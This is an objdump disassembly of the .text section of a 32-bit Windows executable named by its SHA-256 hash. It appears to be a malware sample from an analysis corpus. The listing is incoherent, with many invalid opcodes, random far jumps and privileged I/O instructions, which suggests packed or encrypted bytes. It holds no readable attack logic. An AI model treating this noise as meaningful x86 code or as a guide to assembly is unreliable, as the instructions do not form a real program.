
cd68383a2039bc6cefaaf80a67aff9abaebf7b1ec4c606d9de861cb81a72c92b.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	inc    ebp
  411001:	(bad)  [eax+0x78]
  411004:	inc    esi
  411005:	xor    al,0xfe
  411007:	mov    ds:0x4181bd7e,eax
  41100c:	sbb    al,0xc5
  41100e:	mov    ds:0x73fb473e,eax
  411013:	push   edi
  411014:	stc    
  411015:	dec    esp
  411016:	out    dx,eax
  411017:	sar    al,1
  411019:	das    
  41101a:	mov    dl,0xe3
  41101c:	jo     0x410fac
  41101e:	shl    DWORD PTR cs:[ecx+0x62439db5],0xc8
  411026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411027:	sti    
  411028:	and    DWORD PTR [eax],esp
  41102a:	add    ebx,DWORD PTR [edi+0x5a84d6a7]
  411030:	sbb    ch,BYTE PTR [edi-0x41]
  411033:	call   0xdd89ea80
  411038:	jbe    0x41100f
  41103a:	or     BYTE PTR [bx],al
  41103d:	jmp    0x410fff
  41103f:	xchg   edx,eax
  411040:	sar    DWORD PTR [ebx-0x4a],1
  411043:	push   esp
  411044:	sbb    al,BYTE PTR [edi-0x40a5b0b7]
  41104a:	arpl   WORD PTR [edx],bx
  41104c:	mov    WORD PTR [edx+ebp*1-0x53712b43],bx
  411054:	sub    al,0x41
  411056:	sub    ch,BYTE PTR [ecx-0x491982b5]
  41105c:	fnstenv [edi+0x459ebe4e]
  411062:	sub    BYTE PTR [eax-0x73],cl
  411065:	(bad)  
  411068:	aas    
  411069:	sar    BYTE PTR [edx],1
  41106b:	inc    edi
  41106c:	call   0xdfd2cb34
  411071:	das    
  411072:	and    bh,bh
  411074:	in     al,dx
  411075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411076:	test   ecx,ebp
  411078:	add    esi,DWORD PTR ds:0x97ea2aec
  41107e:	arpl   WORD PTR [edx],bx
  411080:	pop    ebp
  411081:	sbb    BYTE PTR [ecx+0x74],ch
  411084:	test   DWORD PTR [ebp-0x7a],ebp
  411087:	jmp    0xb212:0xc337f70d
  41108e:	dec    ebp
  41108f:	jo     0x41103e
  411091:	inc    esp
  411092:	sbb    al,0xe9
  411094:	mov    bl,0xee
  411096:	jmp    0xb29f505a
  41109b:	mov    dl,0x13
  41109d:	push   ecx
  41109e:	jmp    0xe2753682
  4110a3:	cmp    BYTE PTR [ecx+0x7fa32b23],ch
  4110a9:	cmp    DWORD PTR [esi+ebx*2],ebx
  4110ac:	pop    esi
  4110ad:	lahf   
  4110ae:	ja     0x41103e
  4110b0:	sar    BYTE PTR gs:[ecx-0x59],cl
  4110b4:	call   0xc53ca9e8
  4110b9:	add    ebx,DWORD PTR [ebx+edi*8-0x2031f279]
  4110c0:	xor    dl,BYTE PTR [edi]
  4110c2:	rcl    bh,cl
  4110c4:	adc    cl,BYTE PTR [esi-0x12a13d60]
  4110ca:	push   esi
  4110cb:	mov    bl,BYTE PTR [ecx]
  4110cd:	mov    esp,0xe17cb9b5
  4110d2:	dec    esp
  4110d3:	jp     0x4110d6
  4110d5:	test   BYTE PTR [eax-0x1e],ch
  4110d8:	out    dx,al
  4110d9:	ror    BYTE PTR [ecx+eax*2-0xf9ed574],1
  4110e0:	je     0x4110a3
  4110e2:	int    0xc7
  4110e4:	je     0x411069
  4110e6:	xor    DWORD PTR [eax],ebp
  4110e8:	iret   
  4110e9:	jmp    0x411080
  4110eb:	inc    eax
  4110ec:	jbe    0x411102
  4110ee:	arpl   WORD PTR ds:0x672aa82,sp
  4110f4:	cmp    eax,0xcb5ea85
  4110f9:	iret   
  4110fa:	bound  esi,QWORD PTR ds:0xb7d4999f
  411100:	test   bl,bl
  411102:	and    edx,esi
  411104:	jnp    0x4110b4
  411106:	(bad)  
  411107:	xchg   ebx,eax
  411108:	das    
  411109:	jb     0x411105
  41110b:	ins    DWORD PTR es:[edi],dx
  41110c:	mov    ds:0x45445329,al
  411111:	inc    ecx
  411112:	inc    ebx
  411113:	push   es
  411114:	xor    ah,cl
  411116:	push   edx
  411117:	jno    0x4110cf
  411119:	out    0x46,eax
  41111b:	cmp    ecx,DWORD PTR es:[edx-0x390923ec]
  411122:	sar    DWORD PTR cs:[ebx+0x74],1
  411126:	and    bh,ch
  411128:	mov    al,ds:0xa87594b1
  41112d:	jmp    0x4110fc
  41112f:	mov    ebp,0xbd4c1e91
  411134:	call   0x845a:0xc4229b61
  41113b:	push   ss
  41113c:	xchg   edi,eax
  41113d:	or     al,bl
  41113f:	jne    0x4110e8
  411141:	sub    al,0x42
  411143:	sub    DWORD PTR [ecx],esi
  411145:	jle    0x41110e
  411147:	pop    eax
  411148:	dec    esi
  411149:	xchg   DWORD PTR [esi],esi
  41114b:	mov    bh,0xd7
  41114d:	xchg   ebx,eax
  41114e:	inc    ebp
  41114f:	cmc    
  411150:	pop    es
  411151:	out    dx,al
  411152:	fwait
  411153:	popa   
  411154:	iret   
  411155:	in     eax,dx
  411156:	fist   WORD PTR [eax]
  411158:	bound  edi,QWORD PTR [ebx]
  41115a:	dec    ebx
  41115b:	mov    ebx,0x20d0b748
  411160:	lods   al,BYTE PTR ds:[esi]
  411161:	mov    eax,0xb5041ba0
  411166:	aas    
  411167:	mov    DWORD PTR [ecx+esi*2],edi
  41116a:	jmp    0xd8e6:0xf5a5b02b
  411171:	shl    eax,cl
  411173:	sbb    BYTE PTR ds:0x1649ffb2,0x19
  41117a:	or     al,0x66
  41117c:	push   ecx
  41117d:	push   ecx
  41117e:	sbb    DWORD PTR [edi+0x31],edi
  411181:	mov    bh,bl
  411183:	retf   
  411184:	mov    ebx,DWORD PTR [ecx+0x5e14a847]
  41118a:	xchg   esp,eax
  41118b:	sar    al,cl
  41118d:	adc    al,0xc1
  41118f:	push   ebx
  411190:	ins    BYTE PTR es:[edi],dx
  411191:	pop    es
  411192:	popf   
  411193:	addr16 mov esp,0x548ee7bc
  411199:	icebp  
  41119a:	int3   
  41119b:	aas    
  41119c:	imul   esi,ebp
  41119f:	in     eax,dx
  4111a0:	sub    ebx,DWORD PTR [ebx]
  4111a2:	push   ebp
  4111a3:	sub    ecx,DWORD PTR [esi]
  4111a5:	stc    
  4111a6:	repz inc esi
  4111a8:	sar    DWORD PTR [ebp+0x4d],0x4e
  4111ac:	retf   0x4b62
  4111af:	dec    edx
  4111b0:	jmp    0x4111f1
  4111b2:	add    BYTE PTR [esi+ecx*1-0x5dca2ba0],dl
  4111b9:	jnp    0x411162
  4111bb:	aaa    
  4111bc:	bound  edx,QWORD PTR [esi+edi*2+0x5d69f0ea]
  4111c3:	inc    ecx
  4111c4:	(bad)  
  4111c5:	loopne 0x411226
  4111c7:	sbb    DWORD PTR [ebx],esp
  4111c9:	sub    eax,0x77d703f3
  4111ce:	stc    
  4111cf:	dec    ecx
  4111d0:	rol    DWORD PTR [ecx+0x71],0x10
  4111d4:	inc    edx
  4111d5:	out    0x63,eax
  4111d7:	rcr    BYTE PTR [esi-0x22],1
  4111da:	adc    ebx,DWORD PTR [esi-0xe]
  4111dd:	das    
  4111de:	jge    0x411238
  4111e0:	(bad)  [ebp-0x4d631713]
  4111e6:	cwde   
  4111e7:	pop    edx
  4111e8:	push   ss
  4111e9:	(bad)  
  4111ea:	into   
  4111eb:	mov    bl,0x3a
  4111ed:	sti    
  4111ee:	lea    esi,[ecx]
  4111f0:	scas   eax,DWORD PTR es:[edi]
  4111f1:	jg     0x411178
  4111f3:	push   eax
  4111f4:	and    BYTE PTR [edi-0x73],ch
  4111f7:	addr16 jp 0x4111cf
  4111fa:	(bad)
  4111ff:	mov    ?,WORD PTR [ebx+ebx*4-0x3279a69c]
  411206:	js     0x4111e2
  411208:	popf   
  411209:	mov    ah,0x6a
  41120b:	and    BYTE PTR [esi+0x22],ah
  41120e:	ret    0xd2fe
  411211:	pop    esp
  411212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411213:	push   ss
  411214:	das    
  411215:	push   ecx
  411216:	or     ch,cl
  411218:	or     ebx,0xba09d233
  41121e:	sub    BYTE PTR ds:0x74560c59,0x95
  411225:	js     0x41123d
  411227:	jne    0x41128b
  411229:	add    eax,0x9a3b21fd
  41122e:	pop    es
  41122f:	in     eax,dx
  411230:	xor    eax,0x605d1e09
  411235:	jp     0x411279
  411237:	ret    
  411238:	xchg   ebp,eax
  411239:	inc    ecx
  41123a:	sub    eax,0xd6e2e9c
  41123f:	add    al,0x2f
  411241:	pop    ebx
  411242:	cmp    BYTE PTR [ebx+0x4f34f0ba],bl
  411248:	rcr    BYTE PTR [edx+0x55b1ae73],0xfc
  41124f:	or     cl,BYTE PTR [eax]
  411251:	xor    DWORD PTR [edi-0x6ddb527b],esp
  411257:	inc    ebx
  411258:	inc    esp
  411259:	adc    BYTE PTR [edi],dh
  41125b:	dec    ebx
  41125c:	popf   
  41125d:	mov    eax,ds:0xdf37033b
  411262:	mov    esi,0x816afc0a
  411267:	push   ds
  411268:	mov    eax,ds:0xc27e5714
  41126d:	cli    
  41126e:	aam    0x5c
  411270:	cmp    BYTE PTR [ecx-0x5a],dh
  411273:	sub    eax,0x3955551b
  411278:	sbb    al,dl
  41127a:	or     DWORD PTR [edi-0x43],edi
  41127d:	(bad)  
  41127e:	(bad)  
  41127f:	pop    ebx
  411280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411281:	arpl   WORD PTR [eax],bx
  411283:	hlt    
  411284:	mov    dh,0xd1
  411286:	jmp    0xa3fb:0x2e17e272
  41128d:	cmp    al,0x5f
  41128f:	mov    ebx,0x3ea20356
  411294:	cs inc eax
  411296:	cmp    BYTE PTR [edi+0x61],0x36
  41129a:	jne    0x4112cc
  41129c:	mov    ebp,0x4d05fde3
  4112a1:	dec    ebp
  4112a2:	nop
  4112a3:	sbb    eax,0x5ede8d87
  4112a8:	mov    eax,ds:0xa0e257c2
  4112ad:	jne    0x4112e8
  4112af:	minps  xmm4,XMMWORD PTR [edi-0x4f]
  4112b3:	add    eax,0xaa1be6a6
  4112b8:	xchg   esp,eax
  4112b9:	scas   eax,DWORD PTR es:[edi]
  4112ba:	popf   
  4112bb:	mov    dh,0xb6
  4112bd:	mov    dh,0x44
  4112bf:	jbe    0x41130b
  4112c1:	cmp    eax,edi
  4112c3:	(bad)  
  4112c4:	sub    BYTE PTR [edx+0x2810d563],dl
  4112ca:	cmc    
  4112cb:	jae    0x411276
  4112cd:	stc    
  4112ce:	div    DWORD PTR [edi+ecx*2]
  4112d1:	aad    0x51
  4112d3:	sub    al,0x42
  4112d6:	aam    0xe5
  4112d8:	xchg   esi,eax
  4112d9:	cdq    
  4112da:	je     0x411287
  4112dc:	cmovnp ebx,ecx
  4112df:	adc    eax,0x9ed11a4a
  4112e4:	jae    0x411327
  4112e6:	leave  
  4112e7:	popa   
  4112e8:	xchg   ebp,eax
  4112e9:	jbe    0x4112b8
  4112eb:	and    esi,ecx
  4112ed:	or     BYTE PTR [eax],dl
  4112ef:	xor    BYTE PTR [edi-0x71],dh
  4112f2:	push   ebx
  4112f3:	jb     0x41131a
  4112f5:	call   0xd2d0ee22
  4112fa:	mov    ch,0x10
  4112fc:	mov    esi,DWORD PTR ds:0xba102b85
  411302:	test   DWORD PTR [esi+0x7e],edi
  411305:	cli    
  411306:	jbe    0x411343
  411308:	mov    WORD PTR [edi-0x61],es
  41130b:	sbb    al,0x5e
  41130d:	ret    0xa6e
  411310:	sub    bl,BYTE PTR [esi-0x4cb9cc2]
  411316:	adc    ch,dl
  411318:	and    BYTE PTR [edx],cl
  41131a:	test   al,0xc3
  41131c:	ds push ebx
  41131e:	sbb    al,0x97
  411320:	ret    0x91a1
  411323:	lods   eax,DWORD PTR ds:[esi]
  411324:	pop    ecx
  411325:	das    
  411326:	inc    edi
  411327:	imul   ecx,DWORD PTR [ebp*4+0x39e0a75e],0x56
  41132f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411330:	aad    0x7d
  411332:	shl    esi,1
  411334:	pop    esp
  411335:	stos   DWORD PTR es:[edi],eax
  411336:	ret    0x9ba5
  411339:	fisttp WORD PTR [ebp+0x6e]
  41133c:	jnp    0x4113ad
  41133e:	xchg   ebp,eax
  41133f:	neg    ebp
  411341:	shl    BYTE PTR [esi+0x5a0ece0e],0x34
  411348:	loopne 0x4112d0
  41134a:	mov    bh,0xab
  41134c:	sbb    al,0xab
  41134e:	add    edi,edi
  411350:	fcomp  st(1)
  411352:	mov    esi,0xe14363e
  411357:	leave  
  411358:	cdq    
  411359:	push   cs
  41135a:	xchg   ebx,eax
  41135b:	cdq    
  41135c:	in     eax,0xb9
  41135e:	das    
  41135f:	ror    BYTE PTR [edx+0x652bb1a3],cl
  411365:	dec    bx
  411367:	scas   al,BYTE PTR es:[edi]
  411368:	xchg   ecx,eax
  411369:	scas   al,BYTE PTR es:[edi]
  41136a:	inc    ebx
  41136b:	mov    bl,0x1
  41136d:	xor    al,0xce
  41136f:	std    
  411370:	adc    BYTE PTR [ecx-0x22],bl
  411373:	outs   dx,BYTE PTR ds:[esi]
  411374:	jbe    0x411353
  411376:	fs sbb al,0x59
  411379:	repnz mov esi,0x77eb17ee
  41137f:	pop    eax
  411380:	mov    dh,0x76
  411382:	sbb    al,0xfe
  411384:	icebp  
  411385:	push   ebp
  411386:	pop    ds
  411387:	test   eax,0x4e5cbf5e
  41138c:	in     al,dx
  41138d:	mov    edi,ecx
  41138f:	mov    DWORD PTR [eax+0x22],ecx
  411392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411393:	adc    DWORD PTR [esi],ebp
  411395:	jbe    0x4113dc
  411397:	call   0x440e:0x10b2f085
  41139e:	js     0x411418
  4113a0:	cli    
  4113a1:	xchg   ebp,eax
  4113a2:	imul   esp,ebp,0x44ec3154
  4113a8:	add    eax,DWORD PTR [edi+edi*4]
  4113ab:	sti    
  4113ac:	pusha  
  4113ad:	les    esi,FWORD PTR [edi-0x5f]
  4113b0:	cmp    ah,BYTE PTR [edx-0x306b27a6]
  4113b6:	adc    edi,esi
  4113b8:	pop    edx
  4113b9:	lock scas eax,DWORD PTR es:[edi]
  4113bb:	psubd  mm2,QWORD PTR [ebx+0xa615d42]
  4113c2:	into   
  4113c3:	in     eax,0x55
  4113c5:	cld    
  4113c6:	xlat   BYTE PTR ds:[ebx]
  4113c7:	scas   al,BYTE PTR es:[edi]
  4113c8:	mov    ecx,0x5efc4e73
  4113cd:	sub    ebp,edx
  4113cf:	loope  0x4113c6
  4113d1:	imul   edi,DWORD PTR [esi+0x42],0xffffffca
  4113d5:	mov    esi,0xbe2ee460
  4113da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113db:	adc    eax,0x28529d25
  4113e0:	inc    ebx
  4113e1:	adc    al,0x78
  4113e3:	ror    BYTE PTR [eax-0x78],cl
  4113e6:	inc    ebp
  4113e7:	xchg   ebp,eax
  4113e8:	cmc    
  4113e9:	or     eax,0xe436a1f1
  4113ee:	sub    eax,0xae52c92f
  4113f3:	fwait
  4113f4:	mov    eax,0xd334dc28
  4113f9:	mov    ebp,0xaec137e6
  4113fe:	push   0xeafe0787
  411403:	aad    0x2b
  411405:	int3   
  411406:	jge    0x4113ec
  411408:	jg     0x411466
  41140a:	dec    ecx
  41140b:	xchg   ecx,eax
  41140c:	push   ebx
  41140d:	pop    ebx
  41140e:	pop    es
  41140f:	addr16 push 0x79b98dde
  411415:	call   DWORD PTR [edx+0x6a524d35]
  41141b:	ss pop ebp
  41141d:	sub    eax,0x3312f7f3
  411422:	pop    edi
  411423:	push   ds
  411424:	lock arpl WORD PTR [ebx+ecx*1+0x2b],bp
  411429:	mov    bl,0x55
  41142b:	cmp    ebx,edi
  41142d:	(bad)  
  41142e:	repnz adc eax,DWORD PTR [esi+edx*2]
  411432:	jge    0x411432
  411434:	ja     0x411435
  411436:	out    0x6c,al
  411438:	or     dl,ah
  41143a:	js     0x4113e6
  41143c:	push   edx
  41143d:	aas    
  41143e:	pusha  
  41143f:	cwde   
  411440:	retf   0x3ecf
  411443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411444:	psllw  mm1,QWORD PTR [edx+0x664abab4]
  41144b:	pusha  
  41144c:	xchg   ecx,eax
  41144d:	mov    ebp,0xc8aa3bf8
  411452:	das    
  411453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411454:	popa   
  411455:	dec    eax
  411456:	jmp    0x411416
  411458:	popf   
  411459:	test   BYTE PTR [edi-0x1b9b2060],bh
  41145f:	repz inc eax
  411461:	int3   
  411462:	neg    DWORD PTR [ebx+0x0]
  411465:	test   DWORD PTR [ecx+0x57],ebx
  411468:	call   0x5e10a3ec
  41146d:	shl    DWORD PTR [esi-0x3e3e2fbd],1
  411473:	sbb    eax,DWORD PTR ds:0x80d8596e
  411479:	mov    ds:0x7213e5fc,eax
  41147e:	and    ecx,DWORD PTR [ecx-0x68]
  411481:	dec    edi
  411482:	cmp    al,0x51
  411484:	sbb    bh,al
  411486:	add    ebx,ebp
  411488:	mov    esp,0x79dc3781
  41148d:	mov    al,0x86
  41148f:	fidiv  WORD PTR [edi]
  411491:	rcl    BYTE PTR ds:0xe7e27b68,cl
  411497:	or     al,0x9a
  411499:	imul   eax,DWORD PTR [eax-0x6e],0xffffffff
  41149d:	push   eax
  41149e:	push   ebx
  41149f:	aas    
  4114a0:	aas    
  4114a1:	stos   DWORD PTR es:[edi],eax
  4114a2:	shr    DWORD PTR [edx-0x7866916a],0x26
  4114a9:	fidiv  WORD PTR [ecx+0x4432974a]
  4114af:	sar    BYTE PTR fs:[eax-0x1a],0xa2
  4114b4:	call   0x23ce:0x24b59cbf
  4114bb:	push   0x11
  4114bd:	jmp    0x10c8:0x6cfa4c01
  4114c4:	inc    ebx
  4114c5:	pusha  
  4114c6:	dec    eax
  4114c7:	es dec ecx
  4114c9:	in     al,0xe8
  4114cb:	rcl    BYTE PTR [edx+0x6f2aff69],cl
  4114d1:	push   esp
  4114d2:	ficom  WORD PTR [ecx]
  4114d4:	es gs pop edi
  4114d7:	rol    DWORD PTR [ecx+0x6735e0d1],1
  4114dd:	dec    esp
  4114de:	das    
  4114df:	retf   
  4114e0:	dec    esp
  4114e1:	jecxz  0x411467
  4114e3:	jnp    0x4114e2
  4114e5:	sbb    eax,0xe62006ce
  4114ea:	stos   BYTE PTR es:[edi],al
  4114eb:	xchg   edi,eax
  4114ec:	add    eax,0xc5aaabb5
  4114f1:	cmp    eax,0xfca40e1a
  4114f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114f7:	hlt    
  4114f8:	adc    al,0x90
  4114fa:	and    esi,DWORD PTR [edx]
  4114fc:	fstp   TBYTE PTR [edx+edx*8-0x637430d2]
  411503:	popa   
  411504:	xchg   ebp,eax
  411505:	in     al,dx
  411506:	and    cl,BYTE PTR [esi+0x9]
  411509:	push   esp
  41150a:	xor    BYTE PTR [edx+0x503bdb4a],cl
  411510:	add    eax,0x645634b3
  411515:	into   
  411516:	(bad)  
  411517:	leave  
  411518:	outs   dx,DWORD PTR ds:[esi]
  411519:	inc    ebx
  41151a:	push   0xc2aceab1
  41151f:	lods   al,BYTE PTR ds:[esi]
  411520:	jb     0x411503
  411522:	or     edx,DWORD PTR [ecx]
  411524:	dec    ebp
  411525:	pop    ss
  411526:	dec    ebp
  411527:	dec    esi
  411528:	push   es
  411529:	sub    DWORD PTR [ebp+edi*1+0x9],esp
  41152d:	(bad)  
  41152f:	sbb    al,0xbb
  411531:	test   BYTE PTR [ecx],ah
  411533:	loope  0x41159c
  411535:	mov    ?,WORD PTR [edi+ecx*1-0x5e]
  411539:	sbb    al,BYTE PTR [edx+0x97515f3]
  41153f:	xor    DWORD PTR [edx-0x3efbaa18],edi
  411545:	cmp    esi,DWORD PTR [esi]
  411547:	mov    ah,0x5
  411549:	jno    0x411502
  41154b:	mov    bh,0x64
  41154d:	imul   DWORD PTR cs:[ebx]
  411550:	imul   edi,DWORD PTR [edi],0x4
  411553:	ror    esp,cl
  411555:	and    BYTE PTR [edi],dh
  411557:	mov    al,ds:0x87b01e0d
  41155c:	pop    ecx
  41155d:	jmp    DWORD PTR [eax-0x11]
  411560:	sbb    eax,0xdb84ef7c
  411565:	cmp    DWORD PTR [esi+0xececf63],esi
  41156b:	pop    ebp
  41156c:	bound  eax,QWORD PTR [ecx+0x7a]
  41156f:	mul    DWORD PTR [edi]
  411571:	jbe    0x411594
  411573:	sbb    eax,0xdfd307a7
  411578:	popa   
  411579:	xchg   edx,eax
  41157a:	push   edi
  41157b:	cli    
  41157c:	mov    ah,0x84
  41157e:	out    0xa7,eax
  411580:	imul   edx,edi,0x260d513e
  411586:	or     BYTE PTR [ebx],0xd9
  411589:	(bad)  
  41158a:	js     0x4115c1
  41158c:	cmp    BYTE PTR [eax],al
  41158e:	jp     0x411551
  411590:	fldenv [ecx]
  411592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411593:	push   ebp
  411594:	xchg   edx,eax
  411595:	in     eax,0x56
  411597:	sahf   
  411598:	sbb    ecx,DWORD PTR [ecx+eax*1+0xf1354ea]
  41159f:	mov    eax,0x3fa460f9
  4115a4:	and    al,0xa1
  4115a6:	fistp  WORD PTR [edi]
  4115a8:	sub    DWORD PTR [edi-0xe],esi
  4115ab:	jns    0x41157e
  4115ad:	push   esi
  4115ae:	inc    ebx
  4115af:	xchg   esp,eax
  4115b0:	call   0x739d94e9
  4115b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115b6:	xchg   ebp,eax
  4115b7:	xor    DWORD PTR [esi+eiz*8],0xc
  4115bb:	fild   WORD PTR [eax-0x5a4665c]
  4115c1:	xor    DWORD PTR [ecx],ecx
  4115c3:	inc    ebx
  4115c4:	hlt    
  4115c5:	xor    ecx,edx
  4115c7:	mov    bh,0x6f
  4115c9:	mov    DWORD PTR [eax+0x38],edx
  4115cc:	ja     0x4115e0
  4115ce:	jecxz  0x411552
  4115d0:	mov    eax,0x88dec98c
  4115d5:	test   eax,0xe505dd64
  4115da:	js     0x411638
  4115dc:	popf   
  4115dd:	aas    
  4115de:	mov    DWORD PTR [edi-0x529a862a],edi
  4115e4:	lds    ebp,FWORD PTR [esi]
  4115e6:	gs pushf 
  4115e8:	xchg   edx,eax
  4115e9:	(bad)  
  4115ea:	sbb    BYTE PTR [edx+0x45],al
  4115ed:	xlat   BYTE PTR ds:[ebx]
  4115ee:	lea    ebx,[ebx]
  4115f0:	ja     0x41166c
  4115f2:	cmp    al,0x9e
  4115f4:	adc    edx,DWORD PTR ds:0x23e8fdd3
  4115fa:	adc    BYTE PTR [edi],ch
  4115fc:	xchg   esi,eax
  4115fd:	cdq    
  4115fe:	push   ss
  4115ff:	jns    0x411673
  411601:	pop    edi
  411602:	add    esi,edx
  411604:	pushf  
  411605:	dec    edi
  411606:	data16 cmp BYTE PTR [ecx],ch
  411609:	pop    ds
  41160a:	push   esi
  41160b:	pop    eax
  41160c:	add    DWORD PTR [eax-0x46],esi
  41160f:	test   al,0x37
  411611:	pop    edi
  411612:	or     DWORD PTR [edi+eax*4+0x4a3677da],ebp
  411619:	mov    ds:0x8c94bfbc,eax
  41161e:	data16 jb 0x411665
  411621:	rcr    esp,0x1b
  411624:	int3   
  411625:	cmp    DWORD PTR [eax+0x2a],esi
  411628:	stos   DWORD PTR es:[edi],eax
  411629:	inc    DWORD PTR [esi+0x1308dd9b]
  41162f:	jo     0x4115d6
  411631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411632:	jno    0x41166b
  411634:	xlat   BYTE PTR ds:[ebx]
  411635:	fcom   DWORD PTR [edi]
  411637:	inc    ebx
  411638:	xchg   cl,bh
  41163a:	lea    eax,[eax+0xc6ea7e]
  411640:	adc    esp,DWORD PTR [ecx+0x17]
  411643:	pop    ss
  411644:	add    edx,DWORD PTR [edx]
  411646:	mov    cl,BYTE PTR [ebp+0x3a2de021]
  41164c:	dec    esp
  41164d:	or     eax,0x37dbf1e
  411652:	mov    fs,WORD PTR [edi-0x77f3d62]
  411658:	enter  0x334f,0xb6
  41165c:	cmp    DWORD PTR [ebx+0xc753053],esi
  411662:	jp     0x411669
  411664:	cmc    
  411665:	jge    0x4116c0
  411667:	fist   WORD PTR [ecx+edx*4+0x44b5566f]
  41166e:	or     al,0xb9
  411670:	hlt    
  411671:	xor    dl,dl
  411673:	xchg   ebx,eax
  411674:	add    al,0x31
  411676:	in     al,0x1f
  411678:	dec    ebp
  411679:	loop   0x411657
  41167b:	scas   eax,DWORD PTR es:[edi]
  41167c:	xchg   edx,eax
  41167d:	lds    ebx,FWORD PTR [edi+0x7946e20b]
  411683:	and    DWORD PTR [esp+esi*1+0x7209a7b4],esi
  41168a:	and    ebp,eax
  41168c:	ret    0xdfbc
  41168f:	jmp    0x411708
  411691:	add    bl,ah
  411693:	add    ah,cl
  411695:	mov    ebp,0xa9ff020c
  41169a:	cli    
  41169b:	and    DWORD PTR [eax-0x39],edx
  41169e:	push   esi
  41169f:	mov    dl,0xd0
  4116a1:	(bad)  [edx+0xffce3d6]
  4116a7:	loope  0x411704
  4116a9:	push   DWORD PTR [eax+0x18355f02]
  4116af:	sub    ah,ch
  4116b1:	sti    
  4116b2:	mov    fs,WORD PTR [esi]
  4116b4:	jl     0x411724
  4116b6:	cmp    ecx,eax
  4116b8:	sub    al,0x73
  4116ba:	dec    ebp
  4116bb:	jmp    0x411701
  4116bd:	cli    
  4116be:	outs   dx,DWORD PTR ds:[esi]
  4116bf:	mov    fs,WORD PTR [esi-0x7b24ca58]
  4116c5:	in     eax,dx
  4116c6:	add    DWORD PTR [ecx-0x5c0b06f2],0xffffffc5
  4116cd:	mov    ah,0x1e
  4116cf:	inc    esi
  4116d0:	inc    eax
  4116d1:	inc    ebp
  4116d2:	and    cl,ah
  4116d4:	mov    ds:0xb0d510b9,al
  4116d9:	mov    al,0x15
  4116db:	ins    BYTE PTR es:[edi],dx
  4116dc:	ja     0x411703
  4116de:	adc    al,0xbe
  4116e0:	mov    ch,0x52
  4116e2:	(bad)  
  4116e3:	shl    DWORD PTR [esp+eax*1],1
  4116e6:	scas   eax,DWORD PTR es:[edi]
  4116e7:	add    eax,0xf13531bc
  4116ec:	pop    ebp
  4116ed:	in     eax,dx
  4116ee:	xchg   ebx,eax
  4116ef:	pop    ebp
  4116f0:	adc    eax,0x77d92425
  4116f5:	lock adc edi,DWORD PTR ds:0x57a0c080
  4116fc:	pop    es
  4116fd:	xchg   BYTE PTR [edx],bh
  4116ff:	xchg   ah,cl
  411701:	add    DWORD PTR [edi+eax*4-0x7f],esi
  411705:	add    DWORD PTR [edi],esp
  411707:	repnz pusha 
  411709:	mov    ah,BYTE PTR [eax]
  41170b:	pop    ebp
  41170c:	sub    dh,BYTE PTR [edx-0xa4330a0]
  411712:	test   BYTE PTR [ecx],dh
  411714:	imul   esp,ebx,0x43
  411717:	sti    
  411718:	and    ebx,DWORD PTR [edi]
  41171a:	js     0x411711
  41171c:	cmp    eax,0x156bc556
  411721:	adc    BYTE PTR [ebx],bh
  411723:	jg     0x4116af
  411725:	mov    dl,BYTE PTR [esi+0x3]
  411728:	cwde   
  411729:	add    BYTE PTR ds:0xf5789d7a,dl
  41172f:	sub    eax,0xd8d14252
  411734:	xchg   esp,eax
  411735:	mov    eax,ds:0xcf2e0237
  41173a:	fistp  WORD PTR [ebp-0x61203527]
  411740:	adc    ecx,DWORD PTR [ecx-0x104f9b43]
  411746:	mov    bh,0x89
  411748:	ja     0x411782
  41174a:	xchg   ebx,eax
  41174b:	mov    bl,0x7d
  41174d:	mov    cl,0x20
  41174f:	dec    ebp
  411750:	mov    bl,0xf
  411752:	push   ebx
  411753:	xchg   ebp,eax
  411754:	loopne 0x411721
  411756:	out    0x10,eax
  411758:	xchg   esi,eax
  411759:	repz icebp 
  41175b:	pop    esp
  41175c:	or     bl,BYTE PTR [ebp+0x49]
  41175f:	scas   al,BYTE PTR es:[di]
  411761:	out    dx,eax
  411762:	cmc    
  411763:	push   0xfffffff5
  411765:	arpl   WORD PTR [ebx],sp
  411767:	lods   eax,DWORD PTR es:[esi]
  411769:	lahf   
  41176a:	(bad)  
  41176c:	dec    esi
  41176d:	sub    dl,BYTE PTR [esi-0x5e]
  411770:	xor    eax,0x811c5d5
  411775:	(bad)  
  411777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411778:	jg     0x41171f
  41177a:	(bad)  
  41177b:	aad    0x1a
  41177d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41177e:	cs mov esp,edx
  411781:	or     BYTE PTR [edx],0x7b
  411784:	or     al,0x59
  411786:	fstp   DWORD PTR [ebp-0x78f4164d]
  41178c:	xor    ebx,DWORD PTR [ecx+eiz*8+0x18]
  411790:	ins    BYTE PTR es:[edi],dx
  411791:	fs je  0x41180f
  411794:	or     al,BYTE PTR [edi+0xaf5c5b7]
  41179a:	out    0xb4,al
  41179c:	mov    cl,0xa0
  41179e:	mov    BYTE PTR [esi-0x4602cd9],al
  4117a4:	sbb    dl,dl
  4117a6:	add    bh,BYTE PTR [edi-0x647e226c]
  4117ac:	pop    es
  4117ad:	inc    edx
  4117ae:	aas    
  4117af:	fs cli 
  4117b1:	fucomp st(7)
  4117b3:	out    0xb2,eax
  4117b5:	retf   
  4117b6:	add    DWORD PTR ds:0x81206dfc,0x48
  4117bd:	fst    DWORD PTR [edx]
  4117bf:	imul   edx,ebx,0xffffffb3
  4117c2:	push   ebx
  4117c3:	pop    ds
  4117c4:	ins    DWORD PTR es:[edi],dx
  4117c5:	enter  0x7c9a,0xbb
  4117c9:	mov    edx,0x7c2ffb59
  4117ce:	mov    esp,0xfa688904
